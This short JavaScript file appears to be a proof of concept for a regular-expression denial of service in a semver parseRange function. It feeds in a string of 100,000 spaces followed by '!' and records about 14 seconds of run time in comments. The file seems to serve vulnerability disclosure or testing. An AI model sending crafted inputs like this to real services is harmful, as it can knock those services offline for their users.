const { parseRange } = require("./semver.js");

//Attack String :""+" "*100000+"!"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "!";

var result = parseRange(str);

// real    0m13.895s
// user    0m13.848s
// sys     0m0.030s
